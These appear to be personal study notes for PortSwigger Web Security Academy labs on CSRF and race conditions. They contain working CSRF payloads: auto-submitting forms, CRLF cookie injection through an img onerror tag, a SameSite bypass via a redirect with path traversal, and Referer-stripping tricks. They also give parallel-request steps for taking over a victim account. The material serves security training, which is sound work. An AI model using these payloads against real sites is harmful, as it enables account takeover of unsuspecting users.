## CSRF Vulnerabilities:
- Send change-email request to repeater and change method to GET with email parameter like /?email=test@test.com Then Extension Tools -> Generate CSRF PoC
  The key here is that when the POST /my-account/change-email endpoint is changed to a GET request, the CSRF token is no longer validated
- Generate CSRF PoC from POST request for email change and ==delete CSRF token
- Generate CSRF PoC from POST request for email change by ==intercepting a POST request== (but no forwarding, don't complete the HTTP workflow for the email change). Works because CSRF token is not tied to session, and is single use.
- ==CSRF where token is tied to non-session cookie== - Generate CSRF PoC from POST request for email change by ==intercepting a POST request== (but no forwarding, don't complete the HTTP workflow for the email change). The payload will look like:
  ...
    \<input type="hidden" name="csrf" value="AY8WjIoDF9Z3EIQR7fndKWjXj5kW8GIq" />
	...
    \<img src="https://lab_id.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=teS425qnjMzpugxNvD3z9U8t6iDZ2WLf%3b%20SameSite=None" onerror="document.forms[0].submit()">
	...
	(The script tag with the autosubmit has been removed and replaced with the image tag, which will set the cookie then submit the document). 
- ==CSRF where token is duplicated in cookie== value in POST body. 
 ...
 \<input type="hidden" name="csrf" value="fake" />
 ...
  Remove the auto-submit \<script> block and instead add the following code to inject the cookie and submit the form:

 ` <img src="https://lab_id.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>`
  

```
<script>
  document.location = "https://lab_id.web-security-academy.net/my-account/change-email?email=pwned@web-security-academy.net&_method=POST";
</script>
```



- ==SameSite Strict bypass via client-side redirect== E.G /resources/js/commentConfirmationRedirect.js. - No CSRF Token
``` 
<script>
document.location="https://lab.com/post/comment/confirmation%3fpostId%3d../my-account/change-email%3femail%3dtesting%40test.com%26submit"
</script>
```

- ==CSRF where Referer validation depends on header being present==  - No CSRF Token
```
<form method="POST" action="https://lab_id.web-security-academy.net/my-account/change-email">
<meta name="referrer" content="never">
<input type="hidden" name="email" value="test@test.com">
</form>
<script>
document.forms[0].submit();
</script>
```
- ==CSRF with broken Referer validation== - No CSRF Token
  In exploit server:
  HTTP/1.1 200 OK
  Content-Type: text/html; charset=utf-8
  Referrer-Policy: unsafe-url //many browsers now strip the query string from the Referer header by default as a security measure. "unsafe-url" overrides it
```
<form method="POST" action="https://lab_id.web-security-academy.net/my-account/change-email">
<input type="hidden" name="email" value="test123@test.com">
<input type="submit" value="submit"/>
</form>
<script>
  history.pushState("","","/?lab_id.web-security-academy.net") //This will cause the Referer header in the generated request to contain the URL of the target site in the query string, just like we tested earlier.
  document.forms[0].submit();
</script>
```

## Race Condition Vulnerabilities
- ==Single-endpoint race conditions==
  Check that changing an email address twice in a row makes the first confimration link invalid, meaning there is a race window in the time when the database edits the email address, rather than appending it.
  Send 20 POST /my-account/change-email in parallel with different values.The recipient email address doeesn't always match the pending new email address.
  Consider that there may be a race window between when the website:
  Kicks off a task that eventually sends an email to the provided address.
  Retrieves data from the database and uses this to render the email template.
  Create a new group with two POST /my-account/change-email, one with  test@exploit_id.exploit-server.net and the other with the carlos@ginandjuice.shop address. 
  Keep sending in parallel until there is an email to change to carlos@ginandjuice.shop, then change email and login as carlos
